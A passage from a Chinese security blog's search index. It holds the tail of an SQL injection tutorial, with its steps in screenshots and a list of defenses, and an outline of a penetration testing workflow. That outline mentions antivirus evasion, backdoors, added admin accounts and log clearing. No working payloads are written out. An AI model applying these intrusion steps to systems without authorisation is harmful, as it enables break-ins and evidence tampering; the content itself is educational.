进行注释了，可以看到网站的页面回复了正常    </p></blockquote><h3 id="3-探测字段列数"><a href="#3-探测字段列数" class="headerlink" title="3.探测字段列数"></a>3.探测字段列数</h3><p>假设列数为 4 进行测试，页面出错，说明小于 4 列<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/SQL-injection2.png" alt=""></p><p>然后列数为 3 进行测试，页面正常，说明存在 3 列<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/SQL-injection3.jpg" alt=""></p><h3 id="4-查看显示位，进行测试"><a href="#4-查看显示位，进行测试" class="headerlink" title="4.查看显示位，进行测试"></a>4.查看显示位，进行测试</h3><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/SQL-injection4.jpg" alt=""></p><blockquote><p>可以看到数据库的版本信息，说明存在sql注入漏洞<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/SQL-injection5.jpg" alt=""></p></blockquote><h1 id="四、sql注入防护技巧"><a href="#四、sql注入防护技巧" class="headerlink" title="四、sql注入防护技巧"></a>四、sql注入防护技巧</h1><ul><li><p>数据与代码分离</p></li><li><p>对用户输入的数据进行严格过滤</p></li><li><p>对特殊字符进行转义</p></li><li><p>使用预编译语句</p></li><li><p>使用安全函数</p></li><li><p>检查数据类型</p></li></ul><hr><p><strong>欢迎在文章最后评论区【留言和讨论】，当然，欢迎点击文章最后的打赏按键，请博主一杯冰阔乐，笑～</strong></p><table>  <tbody><tr>    <td><img width="100" src="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/alipay.bmp"></td>    <td><img width="100" src="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/wechat.bmp"></td>    <td><img width="100" src="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/zan.png"></td>     </tr></tbody></table><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web漏洞 </tag>
            
            <tag> web防护 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试与入侵的区别</title>
      <link href="/archives/93673349.html"/>
      <url>/archives/93673349.html</url>
      
        <content type="html"><![CDATA[<h1 id="渗透测试与入侵的区别"><a href="#渗透测试与入侵的区别" class="headerlink" title="渗透测试与入侵的区别"></a>渗透测试与入侵的区别</h1><p>渗透测试：以安全为基本原则，通过攻击者以及防御者的角度去分析目标所存在的安全隐患以及脆弱性，以保护系统安全为最终目标。</p><p>入侵：通过各种方法，甚至破坏性的操作，来获取系统权限以及各种敏感信息。</p><h1 id="一般渗透测试流程"><a href="#一般渗透测试流程" class="headerlink" title="一般渗透测试流程"></a>一般渗透测试流程</h1><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/bp1.0.jpg" alt=""></p><h2 id="1-明确目标"><a href="#1-明确目标" class="headerlink" title="1. 明确目标"></a>1. 明确目标</h2><ul><li><p>l  确定范围：测试目标的范围、ip、域名、内外网、测试账户。</p></li><li><p>l  确定规则：能渗透到什么程度，所需要的时间、能否修改上传、能否提权、等等。</p></li><li><p>l  确定需求：web应用的漏洞、业务逻辑漏洞、人员权限管理漏洞、等等。</p></li></ul><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2. 信息收集"></a>2. 信息收集</h2><ul><li><p>l  方式：主动扫描，开放搜索等。</p></li><li><p>l  开放搜索：利用搜索引擎获得：后台、未授权页面、敏感url、等等。</p></li><li><p>l  基础信息：IP、网段、域名、端口。</p></li><li><p>l  应用信息：各端口的应用。例如web应用、邮件应用、等等。</p></li><li><p>l  系统信息：操作系统版本</p></li><li><p>l  版本信息：所有这些探测到的东西的版本。</p></li><li><p>l  服务信息：中间件的各类信息，插件信息。</p></li><li><p>l  人员信息：域名注册人员信息，web应用中发帖人的id，管理员姓名等。</p></li><li><p>l  防护信息：试着看能否探测到防护设备。</p></li></ul><h2 id="3-漏洞探测"><a href="#3-漏洞探测" class="headerlink" title="3. 漏洞探测"></a>3. 漏洞探测</h2><p>利用上一步中列出的各种系统，应用等使用相应的漏洞。</p><p>方法：</p><ul><li><p>(1)   漏扫，awvs，IBM appscan等。</p></li><li><p>(2)   结合漏洞去exploit-db等位置找利用。</p></li><li><p>(3)   在网上寻找验证poc。<br>内容：</p></li><li><p>l  系统漏洞：系统没有及时打补丁</p></li><li><p>l  WebSever漏洞：WebSever配置问题</p></li><li><p>l  Web应用漏洞：Web应用开发问题</p></li><li><p>l  其它端口服务漏洞：各种21/8080(st2)/7001/22/3389</p></li><li><p>l  通信安全：明文传输，token在cookie中传送等。</p></li></ul><h2 id="4-漏洞验证"><a href="#4-漏洞验证" class="headerlink" title="4. 漏洞验证"></a>4. 漏洞验证</h2><p>将上一步中发现的有可能可以成功利用的全部漏洞都验证一遍。结合实际情况，搭建模拟环境进行试验。成功后再应用于目标中。</p><ul><li><p>l  自动化验证：结合自动化扫描工具提供的结果</p></li><li><p>l  手工验证，根据公开资源进行验证</p></li><li><p>l  试验验证：自己搭建模拟环境进行验证</p></li><li><p>l  登陆猜解：有时可以尝试猜解一下登陆口的账号密码等信息</p></li><li><p>l  业务漏洞验证：如发现业务漏洞，要进行验证</p></li></ul><p>公开资源的利用</p><ul><li><p>l  exploit-db/wooyun/</p></li><li><p>l  google hacking</p></li><li><p>l  渗透代码网站</p></li><li><p>l  通用、缺省口令</p></li><li><p>l  厂商的漏洞警告等等。</p></li></ul><h2 id="5-信息分析"><a href="#5-信息分析" class="headerlink" title="5. 信息分析"></a>5. 信息分析</h2><p>为下一步实施渗透做准备。</p><ul><li><p>l  精准打击：准备好上一步探测到的漏洞的exp，用来精准打击</p></li><li><p>l  绕过防御机制：是否有防火墙等设备，如何绕过</p></li><li><p>l  定制攻击路径：最佳工具路径，根据薄弱入口，高内网权限位置，最终目标</p></li><li><p>l  绕过检测机制：是否有检测机制，流量监控，杀毒软件，恶意代码检测等（免杀）</p></li><li><p>l  攻击代码：经过试验得来的代码，包括不限于xss代码，sql注入语句等</p></li></ul><h2 id="6-获取所需"><a href="#6-获取所需" class="headerlink" title="6. 获取所需"></a>6. 获取所需</h2><p>实施攻击：根据前几步的结果，进行攻击</p><ul><li><p>l  获取内部信息：基础设施（网络连接，vpn，路由，拓扑等）</p></li><li><p>l  进一步渗透：内网入侵，敏感目标</p></li><li><p>l  持续性存在：一般我们对客户做渗透不需要。rookit，后门，添加管理账号，驻扎手法等</p></li><li><p>l  清理痕迹：清理相关日志（访问，操作），上传文件等</p></li></ul><h2 id="7-信息整理"><a href="#7-信息整理" class="headerlink" title="7. 信息整理"></a>7. 信息整理</h2><ul><li><p>l  整理渗透工具：整理渗透过程中用到的代码，poc，exp等</p></li><li><p>l  整理收集信息：整理渗透过程中收集到的一切信息</p></li><li><p>l  整理漏洞信息：整理渗透过程中遇到的各种漏洞，各种脆弱位置信息</p></li></ul><h2 id="8-形成报告"><a href="#8-形成报告" class="headerlink" title="8. 形成报告"></a>8. 形成报告</h2><ul><li><p>l  按需整理：按照之前第一步跟客户确定好的范围，需求来整理资料，并将资料形成报告</p></li><li><p>l  补充介绍：要对漏洞成因，验证过程和带来危害进行分析</p></li><li><p>l  修补建议：当然要对所有产生的问题提出合理高效安全的解决办法</p></li></ul><h1 id="流程总结"><a href="#流程总结" class="headerlink" title="流程总结"></a>流程总结</h1><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/bp1.1.jpg" alt=""></p><hr><p><strong>欢迎在文章最后评论区【留言和讨论】，当然，欢迎点击文章最后的打赏按键，请博主一杯冰阔乐，笑～</strong></p><table>  <tbody><tr>    <td><img width="100" src="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/alipay.bmp"></td>    <td><img width="100" src="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/wechat.bmp"></td>    <td><img width="100" src="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/zan.png"></td>     </tr></tbody></table><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
